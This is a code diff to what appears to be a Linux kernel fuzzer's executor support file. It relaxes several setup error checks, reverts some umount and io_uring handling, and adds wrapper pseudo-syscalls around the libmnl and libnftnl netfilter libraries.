@@ -1106,19 +1106,25 @@ static void initialize_wifi_devices(void)
 		return;
 #endif
 	int rfkill = open("/dev/rfkill", O_RDWR);
-	if (rfkill == -1)
-		fail("open(/dev/rfkill) failed");
-	struct rfkill_event event = {0};
-	event.type = RFKILL_TYPE_ALL;
-	event.op = RFKILL_OP_CHANGE_ALL;
-	if (write(rfkill, &event, sizeof(event)) != (ssize_t)(sizeof(event)))
-		fail("write(/dev/rfkill) failed");
-	close(rfkill);
+	if (rfkill == -1) {
+		if (errno != ENOENT && errno != EACCES)
+			fail("open(/dev/rfkill) failed");
+	} else {
+		struct rfkill_event event = {0};
+		event.type = RFKILL_TYPE_ALL;
+		event.op = RFKILL_OP_CHANGE_ALL;
+		if (write(rfkill, &event, sizeof(event)) != (ssize_t)(sizeof(event)))
+			fail("write(/dev/rfkill) failed");
+		close(rfkill);
+	}
 
 	uint8 mac_addr[6] = WIFI_MAC_BASE;
 	int sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
-	if (sock < 0)
-		fail("initialize_wifi_devices: failed to create socket");
+	if (sock < 0) {
+		debug("initialize_wifi_devices: failed to create socket (%d)\n", errno);
+		return;
+	}
+
 	int hwsim_family_id = netlink_query_family_id(&nlmsg, sock, "MAC80211_HWSIM", true);
 	int nl80211_family_id = netlink_query_family_id(&nlmsg, sock, "nl80211", true);
 	uint8 ssid[] = WIFI_IBSS_SSID;
@@ -1461,16 +1467,20 @@ static void netlink_nicvf_setup(void)
 	sprintf(cmdline, "nsenter -t 1 -n ip link set %s netns %d",
 		vf_intf.pass_thru_intf, getpid());
 	if (runcmdline(cmdline))
-		failmsg("failed to run command", "%s", cmdline);
+		return;
+
 	sprintf(cmdline, "ip a s %s", vf_intf.pass_thru_intf);
 	if (runcmdline(cmdline))
-		failmsg("failed to run command", "%s", cmdline);
+		return;
+
 	sprintf(cmdline, "ip link set %s down", vf_intf.pass_thru_intf);
 	if (runcmdline(cmdline))
-		failmsg("failed to run command", "%s", cmdline);
+		return;
+
 	sprintf(cmdline, "ip link set %s name nicvf0", vf_intf.pass_thru_intf);
 	if (runcmdline(cmdline))
-		failmsg("failed to run command", "%s", cmdline);
+		return;
+
 	debug("nicvf0 VF pass-through setup complete.\n");
 }
 #endif // SYZ_NIC_VF
@@ -1739,9 +1749,8 @@ static int read_tun(char* data, int size)
 
 	int rv = read(tunfd, data, size);
 	if (rv < 0) {
-		// EBADF can be returned if the test closes tunfd with close_range syscall.
 		// Tun sometimes returns EBADFD, unclear if it's a kernel bug or not.
-		if (errno == EAGAIN || errno == EBADF || errno == EBADFD)
+		if (errno == EAGAIN || errno == EBADFD)
 			return -1;
 		fail("tun read failed");
 	}
@@ -1926,8 +1935,6 @@ struct io_uring_params {
 
 #define IORING_OFF_SQ_RING 0
 #define IORING_OFF_SQES 0x10000000ULL
-#define IORING_SETUP_SQE128 (1U << 10)
-#define IORING_SETUP_CQE32 (1U << 11)
 
 #include <sys/mman.h>
 #include <unistd.h>
@@ -1943,9 +1950,7 @@ static long syz_io_uring_setup(volatile long a0, volatile long a1, volatile long
 	struct io_uring_params* setup_params = (struct io_uring_params*)a1;
 	void** ring_ptr_out = (void**)a2;
 	void** sqes_ptr_out = (void**)a3;
-	// Temporarily disable IORING_SETUP_CQE32 and IORING_SETUP_SQE128 that may change SIZEOF_IO_URING_CQE and SIZEOF_IO_URING_SQE.
-	// Tracking bug: https://github.com/google/syzkaller/issues/4531.
-	setup_params->flags &= ~(IORING_SETUP_CQE32 | IORING_SETUP_SQE128);
+
 	uint32 fd_io_uring = syscall(__NR_io_uring_setup, entries, setup_params);
 
 	// Compute the ring sizes
@@ -2037,11 +2042,8 @@ static long syz_usbip_server_init(volatile long a0)
 	bool usb3 = (speed == USB_SPEED_SUPER);
 
 	int socket_pair[2];
-	if (socketpair(AF_UNIX, SOCK_STREAM, 0, socket_pair)) {
-		// This can happen if the test calls prlimit(RLIMIT_AS).
-		debug("syz_usbip_server_init: socketpair failed (%d)\n", errno);
-		return -1;
-	}
+	if (socketpair(AF_UNIX, SOCK_STREAM, 0, socket_pair))
+		fail("syz_usbip_server_init: socketpair failed");
 
 	int client_fd = socket_pair[0];
 	int server_fd = socket_pair[1];
@@ -3322,13 +3324,6 @@ static void checkpoint_iptables(struct ipt_table_desc* tables, int num_tables, i
 		switch (errno) {
 		case EAFNOSUPPORT:
 		case ENOPROTOOPT:
-		// ENOENT can be returned if smack lsm is used. Smack tried to aplly netlbl to created sockets,
-		// but the fuzzer can manage to remove netlbl entry for SOCK_STREAM/IPPROTO_TCP using
-		// NLBL_MGMT_C_REMOVE, which is unfortunately global (not part of net namespace). In this state
-		// creation of such sockets will fail all the time in all processes (so in some sense the machine
-		// is indeed broken), but ignoring the error is still probably the best option given we allow
-		// the fuzzer to invoke NLBL_MGMT_C_REMOVE in the first place.
-		case ENOENT:
 			return;
 		}
 		failmsg("iptable checkpoint: socket(SOCK_STREAM, IPPROTO_TCP) failed", "family=%d", family);
@@ -3382,7 +3377,6 @@ static void reset_iptables(struct ipt_table_desc* tables, int num_tables, int fa
 		switch (errno) {
 		case EAFNOSUPPORT:
 		case ENOPROTOOPT:
-		case ENOENT:
 			return;
 		}
 		failmsg("iptable: socket(SOCK_STREAM, IPPROTO_TCP) failed", "family=%d", family);
@@ -3429,7 +3423,6 @@ static void checkpoint_arptables(void)
 		switch (errno) {
 		case EAFNOSUPPORT:
 		case ENOPROTOOPT:
-		case ENOENT:
 			return;
 		}
 		fail("arptable checkpoint: socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) failed");
@@ -3480,7 +3473,6 @@ static void reset_arptables()
 		switch (errno) {
 		case EAFNOSUPPORT:
 		case ENOPROTOOPT:
-		case ENOENT:
 			return;
 		}
 		fail("arptable: socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)");
@@ -3574,7 +3566,6 @@ static void checkpoint_ebtables(void)
 		switch (errno) {
 		case EAFNOSUPPORT:
 		case ENOPROTOOPT:
-		case ENOENT:
 			return;
 		}
 		fail("ebtable checkpoint: socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)");
@@ -3616,7 +3607,6 @@ static void reset_ebtables()
 		switch (errno) {
 		case EAFNOSUPPORT:
 		case ENOPROTOOPT:
-		case ENOENT:
 			return;
 		}
 		fail("ebtable: socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)");
@@ -4528,15 +4518,10 @@ static void remove_dir(const char* dir)
 	DIR* dp = 0;
 retry:
 #if SYZ_EXECUTOR || !SYZ_SANDBOX_ANDROID
-	// Starting from v6.9, it does no longer make sense to use MNT_DETACH, because
-	// a loop device may only be reused in RW mode if no mounted filesystem keeps a
-	// reference to it. So we have to umount them synchronously.
-	// MNT_FORCE should hopefully prevent hangs for filesystems that may require a complex cleanup.
-	const int umount_flags = MNT_FORCE | UMOUNT_NOFOLLOW;
 #if SYZ_EXECUTOR
 	if (!flag_sandbox_android)
 #endif
-		while (umount2(dir, umount_flags) == 0) {
+		while (umount2(dir, MNT_DETACH | UMOUNT_NOFOLLOW) == 0) {
 			debug("umount(%s)\n", dir);
 		}
 #endif
@@ -4562,7 +4547,7 @@ retry:
 #if SYZ_EXECUTOR
 		if (!flag_sandbox_android)
 #endif
-			while (umount2(filename, umount_flags) == 0) {
+			while (umount2(filename, MNT_DETACH | UMOUNT_NOFOLLOW) == 0) {
 				debug("umount(%s)\n", filename);
 			}
 #endif
@@ -4600,7 +4585,7 @@ retry:
 			if (!flag_sandbox_android) {
 #endif
 				debug("umount(%s)\n", filename);
-				if (umount2(filename, umount_flags))
+				if (umount2(filename, MNT_DETACH | UMOUNT_NOFOLLOW))
 					exitf("umount(%s) failed", filename);
 #if SYZ_EXECUTOR
 			}
@@ -4635,7 +4620,7 @@ retry:
 				if (!flag_sandbox_android) {
 #endif
 					debug("umount(%s)\n", dir);
-					if (umount2(dir, umount_flags))
+					if (umount2(dir, MNT_DETACH | UMOUNT_NOFOLLOW))
 						exitf("umount(%s) failed", dir);
 #if SYZ_EXECUTOR
 				}
@@ -4839,16 +4824,6 @@ static void close_fds()
 
 static void setup_fault()
 {
-	int fd = open("/proc/self/make-it-fail", O_WRONLY);
-	if (fd == -1)
-		fail("CONFIG_FAULT_INJECTION is not enabled");
-	close(fd);
-
-	fd = open("/proc/thread-self/fail-nth", O_WRONLY);
-	if (fd == -1)
-		fail("kernel does not have systematic fault injection support");
-	close(fd);
-
 	static struct {
 		const char* file;
 		const char* val;
@@ -4884,12 +4859,6 @@ static void setup_fault()
 
 static void setup_leak()
 {
-	if (!write_file(KMEMLEAK_FILE, "scan=off")) {
-		if (errno == EBUSY)
-			fail("KMEMLEAK disabled: increase CONFIG_DEBUG_KMEMLEAK_EARLY_LOG_SIZE"
-			     " or unset CONFIG_DEBUG_KMEMLEAK_DEFAULT_OFF");
-		fail("failed to write(kmemleak, \"scan=off\")");
-	}
 	// Flush boot leaks.
 	if (!write_file(KMEMLEAK_FILE, "scan"))
 		fail("failed to write(kmemleak, \"scan\")");
@@ -4988,11 +4957,9 @@ static void setup_binfmt_misc()
 {
 	if (mount(0, "/proc/sys/fs/binfmt_misc", "binfmt_misc", 0, 0)) {
 		debug("mount(binfmt_misc) failed: %d\n", errno);
-		return;
 	}
-	if (!write_file("/proc/sys/fs/binfmt_misc/register", ":syz0:M:0:\x01::./file0:") ||
-	    !write_file("/proc/sys/fs/binfmt_misc/register", ":syz1:M:1:\x02::./file0:POC"))
-		fail("write(/proc/sys/fs/binfmt_misc/register) failed");
+	write_file("/proc/sys/fs/binfmt_misc/register", ":syz0:M:0:\x01::./file0:");
+	write_file("/proc/sys/fs/binfmt_misc/register", ":syz1:M:1:\x02::./file0:POC");
 }
 #endif
 
@@ -5002,7 +4969,7 @@ static void setup_binfmt_misc()
 static void setup_kcsan()
 {
 	if (!write_file(KCSAN_DEBUGFS_FILE, "on"))
-		fail("write(/sys/kernel/debug/kcsan, on) failed");
+		fail("failed to enable KCSAN");
 }
 
 #if SYZ_EXECUTOR // currently only used by executor
@@ -5130,16 +5097,18 @@ static void setup_802154()
 		netlink_attr(&nlmsg, NL802154_ATTR_IFINDEX, &ifindex, sizeof(ifindex));
 		netlink_attr(&nlmsg, NL802154_ATTR_SHORT_ADDR, &shortaddr, sizeof(shortaddr));
 		int err = netlink_send(&nlmsg, sock_generic);
-		if (err < 0)
-			fail("NL802154_CMD_SET_SHORT_ADDR failed");
+		if (err < 0) {
+			debug("NL802154_CMD_SET_SHORT_ADDR failed: %s\n", strerror(errno));
+		}
 		netlink_device_change(&nlmsg, sock_route, devname, true, 0, &hwaddr, sizeof(hwaddr), 0);
 		if (i == 0) {
 			netlink_add_device_impl(&nlmsg, "lowpan", "lowpan0", false);
 			netlink_done(&nlmsg);
 			netlink_attr(&nlmsg, IFLA_LINK, &ifindex, sizeof(ifindex));
 			int err = netlink_send(&nlmsg, sock_route);
-			if (err < 0)
-				fail("netlink: adding device lowpan0 type lowpan link wpan0");
+			if (err < 0) {
+				debug("netlink: adding device lowpan0 type lowpan link wpan0: %s\n", strerror(errno));
+			}
 		}
 	}
 	close(sock_route);
@@ -5701,18 +5670,24 @@ static void setup_swap()
 	unlink(SWAP_FILE);
 	// Zero-fill the file.
 	int fd = open(SWAP_FILE, O_CREAT | O_WRONLY | O_CLOEXEC, 0600);
-	if (fd == -1)
+	if (fd == -1) {
 		failmsg("swap file open failed", "file: %s", SWAP_FILE);
+		return;
+	}
 	// We cannot do ftruncate -- swapon complains about this. Do fallocate instead.
 	fallocate(fd, FALLOC_FL_ZERO_RANGE, 0, SWAP_FILE_SIZE);
 	close(fd);
 	// Set up the swap file.
 	char cmdline[64];
 	sprintf(cmdline, "mkswap %s", SWAP_FILE);
-	if (runcmdline(cmdline))
+	if (runcmdline(cmdline)) {
 		fail("mkswap failed");
-	if (swapon(SWAP_FILE, SWAP_FLAG_PREFER) == 1)
+		return;
+	}
+	if (swapon(SWAP_FILE, SWAP_FLAG_PREFER) == 1) {
 		failmsg("swapon failed", "file: %s", SWAP_FILE);
+		return;
+	}
 }
 
 #endif
@@ -5733,4 +5708,1334 @@ static long syz_pidfd_open(volatile long pid, volatile long flags)
 	return syscall(__NR_pidfd_open, pid, flags);
 }
 
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_mnl_socket_open
+#include <libmnl/libmnl.h>
+
+static long syz_mnl_socket_open()
+{
+	struct mnl_socket* nl_sock;
+	nl_sock = mnl_socket_open(NETLINK_NETFILTER);
+	if (nl_sock == NULL)
+		return -1;
+	return (long)nl_sock;
+}
+
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_mnl_socket_close
+#include <libmnl/libmnl.h>
+
+static long syz_mnl_socket_close(volatile long mnl_sock)
+{
+	struct mnl_socket* nl_sock = (struct mnl_socket*)(long)mnl_sock;
+	long ret = mnl_socket_close(nl_sock);
+	return ret;
+}
+
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_mnl_socket_sendto
+#include <libmnl/libmnl.h>
+static long syz_mnl_socket_sendto(volatile long mnl_sock, volatile long buf_ptr, volatile long len_arg)
+{
+	struct mnl_socket* nl_sock = (struct mnl_socket*)(long)mnl_sock;
+	char* buf = (char*)(long)buf_ptr;
+	int len = (long)len_arg;
+	return (long)mnl_socket_sendto(nl_sock, buf, len);
+}
+
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_mnl_nlmsg_batch_start
+#include <libmnl/libmnl.h>
+static long syz_mnl_nlmsg_batch_start(volatile long buf_ptr, volatile long limit_arg)
+{
+	char* buf = (char*)(long)buf_ptr;
+	int limit = (long)limit_arg;
+	return (long)mnl_nlmsg_batch_start(buf, limit);
+}
+
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_mnl_nlmsg_batch_current
+#include <libmnl/libmnl.h>
+static long syz_mnl_nlmsg_batch_current(volatile long nlmsg_batch_ptr)
+{
+	struct mnl_nlmsg_batch* b = (struct mnl_nlmsg_batch*)(long)nlmsg_batch_ptr;
+	return (long)mnl_nlmsg_batch_current(b);
+}
+
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_mnl_nlmsg_batch_next
+#include <libmnl/libmnl.h>
+static long syz_mnl_nlmsg_batch_next(volatile long nlmsg_batch_ptr)
+{
+	struct mnl_nlmsg_batch* b = (struct mnl_nlmsg_batch*)(long)nlmsg_batch_ptr;
+	return (long)mnl_nlmsg_batch_next(b);
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_mnl_nlmsg_batch_head
+#include <libmnl/libmnl.h>
+static long syz_mnl_nlmsg_batch_head(volatile long nlmsg_batch_ptr)
+{
+	struct mnl_nlmsg_batch* b = (struct mnl_nlmsg_batch*)(long)nlmsg_batch_ptr;
+	return (long)mnl_nlmsg_batch_head(b);
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_mnl_nlmsg_batch_size
+#include <libmnl/libmnl.h>
+static long syz_mnl_nlmsg_batch_size(volatile long nlmsg_batch_ptr)
+{
+	struct mnl_nlmsg_batch* b = (struct mnl_nlmsg_batch*)(long)nlmsg_batch_ptr;
+	return (long)mnl_nlmsg_batch_size(b);
+}
+
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_nftnl_table_alloc
+#include <libnftnl/table.h>
+static long syz_nftnl_table_alloc()
+{
+	struct nftnl_table* t = nftnl_table_alloc();
+	return (long)t;
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_nftnl_table_free
+#include <libnftnl/table.h>
+static long syz_nftnl_table_free(volatile long t_ptr)
+{
+	struct nftnl_table* t = (struct nftnl_table*)(long)t_ptr;
+	nftnl_table_free(t);
+	return 0;
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_nftnl_table_set_str
+#include <libnftnl/table.h>
+#include <string>
+static long syz_nftnl_table_set_str(volatile long t_ptr, volatile long attr, volatile long str_ptr)
+{
+	struct nftnl_table* t = (struct nftnl_table*)(long)t_ptr;
+	char* str = (char*)(long)str_ptr;
+	return (long)nftnl_table_set_str(t, attr, str);
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_nftnl_table_set_u32
+#include <libnftnl/table.h>
+static long syz_nftnl_table_set_u32(volatile long t_ptr, volatile long attr, volatile long val)
+{
+	struct nftnl_table* t = (struct nftnl_table*)(long)t_ptr;
+	nftnl_table_set_u32(t, attr, val);
+	return 0;
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_nftnl_table_nlmsg_build_hdr
+#include <libnftnl/table.h>
+static long syz_nftnl_table_nlmsg_build_hdr(volatile long buf_ptr, volatile long type, volatile long family, volatile long flags, volatile long seq)
+{
+	char* buf = (char*)(long)buf_ptr;
+	return (long)nftnl_table_nlmsg_build_hdr(buf, type, family, flags, seq);
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_nftnl_table_nlmsg_build_payload
+#include <libnftnl/table.h>
+static long syz_nftnl_table_nlmsg_build_payload(volatile long nlh_ptr, volatile long t_ptr)
+{
+	struct nlmsghdr* nlh = (struct nlmsghdr*)(long)nlh_ptr;
+	struct nftnl_table* t = (struct nftnl_table*)(long)t_ptr;
+	nftnl_table_nlmsg_build_payload(nlh, t);
+	return 0;
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_nftnl_set_alloc
+#include <libnftnl/set.h>
+static long syz_nftnl_set_alloc()
+{
+	struct nftnl_set* s = nftnl_set_alloc();
+	return (long)s;
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_nftnl_set_set_str
+#include <libnftnl/set.h>
+static long syz_nftnl_set_set_str(volatile long s_ptr, volatile long attr, volatile long str_ptr)
+{
+	struct nftnl_set* s = (struct nftnl_set*)(long)s_ptr;
+	char* str = (char*)(long)str_ptr;
+	return (long)nftnl_set_set_str(s, attr, str);
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_nftnl_set_set_data
+#include <libnftnl/set.h>
+static long syz_nftnl_set_set_data(volatile long s_ptr, volatile long attr, volatile long data_ptr, volatile long data_len)
+{
+	struct nftnl_set* s = (struct nftnl_set*)(long)s_ptr;
+	char* data = (char*)(long)data_ptr;
+	nftnl_set_set_data(s, attr, data, data_len);
+	return 0;
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_nftnl_set_set_u32
+#include <libnftnl/set.h>
+static long syz_nftnl_set_set_u32(volatile long s_ptr, volatile long attr, volatile long val)
+{
+	struct nftnl_set* s = (struct nftnl_set*)(long)s_ptr;
+	nftnl_set_set_u32(s, attr, val);
+	return 0;
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_nftnl_batch_begin
+#include <libmnl/libmnl.h>
+#include <libnftnl/common.h>
+static long syz_nftnl_batch_begin(volatile long buf_ptr, volatile long seq)
+{
+	char* buf = (char*)(long)buf_ptr;
+	// struct mnl_nlmsg_batch* batch = (struct mnl_nlmsg_batch*)(long)batch_ptr;
+	struct nlmsghdr* nftnl_batch = nftnl_batch_begin(buf, seq);
+	return (long)nftnl_batch;
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_nftnl_set_nlmsg_build_payload
+#include <libnftnl/set.h>
+static long syz_nftnl_set_nlmsg_build_payload(volatile long nlh_ptr, volatile long s_ptr)
+{
+	struct nlmsghdr* nlh = (struct nlmsghdr*)(long)nlh_ptr;
+	struct nftnl_set* s = (struct nftnl_set*)(long)s_ptr;
+	nftnl_set_nlmsg_build_payload(nlh, s);
+	return 0;
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_nftnl_set_free
+#include <libnftnl/set.h>
+static long syz_nftnl_set_free(volatile long s_ptr)
+{
+	struct nftnl_set* s = (struct nftnl_set*)(long)s_ptr;
+	nftnl_set_free(s);
+	return 0;
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_nftnl_batch_end
+#include <libnftnl/common.h>
+static long syz_nftnl_batch_end(volatile long buf_ptr, volatile long seq)
+{
+	char* buf = (char*)(long)buf_ptr;
+	struct nlmsghdr* nftnl_batch = nftnl_batch_end(buf, seq);
+	return (long)nftnl_batch;
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_nftnl_expr_alloc
+#include <libnftnl/expr.h>
+static long syz_nftnl_expr_alloc(volatile long name_ptr)
+{
+	char* name = (char*)(long)name_ptr;
+	struct nftnl_expr* e = nftnl_expr_alloc(name);
+	return (long)e;
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_nftnl_expr_set_str
+#include <libnftnl/expr.h>
+static long syz_nftnl_expr_set_str(volatile long e_ptr, volatile long type, volatile long str_ptr)
+{
+	struct nftnl_expr* e = (struct nftnl_expr*)(long)e_ptr;
+	char* str = (char*)(long)str_ptr;
+	return (long)nftnl_expr_set_str(e, type, str);
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_nftnl_expr_set_u32
+#include <libnftnl/expr.h>
+static long syz_nftnl_expr_set_u32(volatile long e_ptr, volatile long type, volatile long data)
+{
+	struct nftnl_expr* e = (struct nftnl_expr*)(long)e_ptr;
+	nftnl_expr_set_u32(e, type, data);
+	return 0;
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_mnl_socket_get_fd
+#include <libmnl/libmnl.h>
+static long syz_mnl_socket_get_fd(volatile long nl_ptr)
+{
+	struct mnl_socket* nl = (struct mnl_socket*)(long)nl_ptr;
+	return mnl_socket_get_fd(nl);
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_mnl_socket_get_portid
+#include <libmnl/libmnl.h>
+static long syz_mnl_socket_get_portid(volatile long nl_ptr)
+{
+	struct mnl_socket* nl = (struct mnl_socket*)(long)nl_ptr;
+	return mnl_socket_get_portid(nl);
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_mnl_socket_fdopen
+#include <libmnl/libmnl.h>
+static long syz_mnl_socket_fdopen(volatile long fd)
+{
+	struct mnl_socket* nl = mnl_socket_fdopen(fd);
+	return (long)nl;
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_mnl_socket_bind
+#include <libmnl/libmnl.h>
+static long syz_mnl_socket_bind(volatile long nl_ptr, volatile long groups, volatile long pid)
+{
+	struct mnl_socket* nl = (struct mnl_socket*)(long)nl_ptr;
+	return mnl_socket_bind(nl, groups, pid);
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_mnl_socket_recvfrom
+#include <libmnl/libmnl.h>
+static long syz_mnl_socket_recvfrom(volatile long mnl_sock, volatile long buf_ptr, volatile long len_arg)
+{
+	struct mnl_socket* nl_sock = (struct mnl_socket*)(long)mnl_sock;
+	void* buf = (void*)(long)buf_ptr;
+	size_t len = (long)len_arg;
+	return (long)mnl_socket_recvfrom(nl_sock, buf, len);
+}
+
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_mnl_socket_getsockopt
+#include <libmnl/libmnl.h>
+static long syz_mnl_socket_getsockopt(volatile long mnl_sock, volatile long type, volatile long buf_ptr, volatile long len_arg)
+{
+	struct mnl_socket* nl_sock = (struct mnl_socket*)(long)mnl_sock;
+	void* buf = (void*)(long)buf_ptr;
+	socklen_t* len = (socklen_t*)(long)len_arg;
+	return (long)mnl_socket_getsockopt(nl_sock, type, buf, len);
+}
+
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_nftnl_chain_alloc
+#include <libnftnl/chain.h>
+static long syz_nftnl_chain_alloc()
+{
+	struct nftnl_chain* chain = nftnl_chain_alloc();
+	return (long)chain;
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_nftnl_chain_free
+#include <libnftnl/chain.h>
+static long syz_nftnl_chain_free(volatile long chain_ptr)
+{
+	struct nftnl_chain* chain = (struct nftnl_chain*)(long)chain_ptr;
+	nftnl_chain_free(chain);
+	return 0;
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_nftnl_chain_set_data
+#include <libnftnl/chain.h>
+static long syz_nftnl_chain_set_data(volatile long chain_ptr, volatile long attr, volatile long data_ptr, volatile long data_len)
+{
+	struct nftnl_chain* chain = (struct nftnl_chain*)(long)chain_ptr;
+	char* data = (char*)(long)data_ptr;
+	nftnl_chain_set_data(chain, attr, data, data_len);
+	return 0;
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_nftnl_chain_set_u32
+#include <libnftnl/chain.h>
+static long syz_nftnl_chain_set_u32(volatile long chain_ptr, volatile long attr, volatile long data)
+{
+	struct nftnl_chain* chain = (struct nftnl_chain*)(long)chain_ptr;
+	nftnl_chain_set_u32(chain, attr, data);
+	return 0;
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_nftnl_chain_set_str
+#include <libnftnl/chain.h>
+static long syz_nftnl_chain_set_str(volatile long chain_ptr, volatile long attr, volatile long str_ptr)
+{
+	struct nftnl_chain* chain = (struct nftnl_chain*)(long)chain_ptr;
+	char* str = (char*)(long)str_ptr;
+	nftnl_chain_set_str(chain, attr, str);
+	return 0;
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_nftnl_expr_free
+#include <libnftnl/expr.h>
+static long syz_nftnl_expr_free(volatile long expr_ptr)
+{
+	struct nftnl_expr* expr = (struct nftnl_expr*)(long)expr_ptr;
+	nftnl_expr_free(expr);
+	return 0;
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_nftnl_expr_set
+#include <libnftnl/expr.h>
+static long syz_nftnl_expr_set(volatile long expr_ptr, volatile long type, volatile long data_ptr, volatile long data_len)
+{
+	struct nftnl_expr* expr = (struct nftnl_expr*)(long)expr_ptr;
+	char* data = (char*)(long)data_ptr;
+	return (long)nftnl_expr_set(expr, type, data, data_len);
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_nftnl_set_elem_alloc
+#include <libnftnl/set.h>
+static long syz_nftnl_set_elem_alloc()
+{
+	struct nftnl_set_elem* set_elem = nftnl_set_elem_alloc();
+	return (long)set_elem;
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_nftnl_set_elem_free
+#include <libnftnl/set.h>
+static long syz_nftnl_set_elem_free(volatile long set_elem_ptr)
+{
+	struct nftnl_set_elem* set_elem = (struct nftnl_set_elem*)(long)set_elem_ptr;
+	nftnl_set_elem_free(set_elem);
+	return 0;
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_nftnl_set_elem_set
+#include <libnftnl/set.h>
+static long syz_nftnl_set_elem_set(volatile long set_elem_ptr, volatile long attr, volatile long data_ptr, volatile long data_len)
+{
+	struct nftnl_set_elem* set_elem = (struct nftnl_set_elem*)(long)set_elem_ptr;
+	int* data = (int*)(long)data_ptr;
+	nftnl_set_elem_set(set_elem, attr, data, data_len);
+	return 0;
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_nftnl_set_elem_add
+#include <libnftnl/expr.h>
+#include <libnftnl/set.h>
+static long syz_nftnl_set_elem_add(volatile long set_ptr, volatile long set_elem_ptr)
+{
+	struct nftnl_set_elem* set_elem = (struct nftnl_set_elem*)(long)set_elem_ptr;
+	struct nftnl_set* set = (struct nftnl_set*)(long)set_ptr;
+	nftnl_set_elem_add(set, set_elem);
+	return 0;
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_nftnl_set_elems_nlmsg_build_payload
+#include <libnftnl/set.h>
+static long syz_nftnl_set_elems_nlmsg_build_payload(volatile long nlh_ptr, volatile long set_ptr)
+{
+	struct nftnl_set* set = (struct nftnl_set*)(long)set_ptr;
+	struct nlmsghdr* nlh = (struct nlmsghdr*)(long)nlh_ptr;
+	nftnl_set_elems_nlmsg_build_payload(nlh, set);
+	return 0;
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_nftnl_rule_alloc
+#include <libnftnl/rule.h>
+static long syz_nftnl_rule_alloc()
+{
+	struct nftnl_rule* rule = nftnl_rule_alloc();
+	return (long)rule;
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_nftnl_rule_free
+#include <libnftnl/rule.h>
+static long syz_nftnl_rule_free(volatile long rule_ptr)
+{
+	struct nftnl_rule* rule = (struct nftnl_rule*)(long)rule_ptr;
+	nftnl_rule_free(rule);
+	return 0;
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_nftnl_rule_set_u32
+#include <libnftnl/rule.h>
+static long syz_nftnl_rule_set_u32(volatile long rule_ptr, volatile long attr, volatile long val)
+{
+	struct nftnl_rule* rule = (struct nftnl_rule*)(long)rule_ptr;
+	nftnl_rule_set_u32(rule, attr, val);
+	return 0;
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_nftnl_rule_set_str
+#include <libnftnl/rule.h>
+static long syz_nftnl_rule_set_str(volatile long rule_ptr, volatile long attr, volatile long str_ptr)
+{
+	struct nftnl_rule* rule = (struct nftnl_rule*)(long)rule_ptr;
+	char* str = (char*)(long)str_ptr;
+	nftnl_rule_set_str(rule, attr, str);
+	return 0;
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_nftnl_rule_nlmsg_build_payload
+#include <libnftnl/rule.h>
+static long syz_nftnl_rule_nlmsg_build_payload(volatile long nlh_ptr, volatile long rule_ptr)
+{
+	struct nftnl_rule* rule = (struct nftnl_rule*)(long)rule_ptr;
+	struct nlmsghdr* nlh = (struct nlmsghdr*)(long)nlh_ptr;
+	nftnl_rule_nlmsg_build_payload(nlh, rule);
+	return 0;
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_mnl_cb_run
+#include <libmnl/libmnl.h>
+static long syz_mnl_cb_run(volatile long buf_ptr, volatile long numbytes, volatile long seq, volatile long portid, volatile long cb_t_ptr, volatile long data_ptr)
+{
+	char* buf = (char*)(long)buf_ptr;
+	char* data = (char*)(long)data_ptr;
+	return mnl_cb_run(buf, numbytes, seq, portid, NULL, data);
+}
+#endif
+
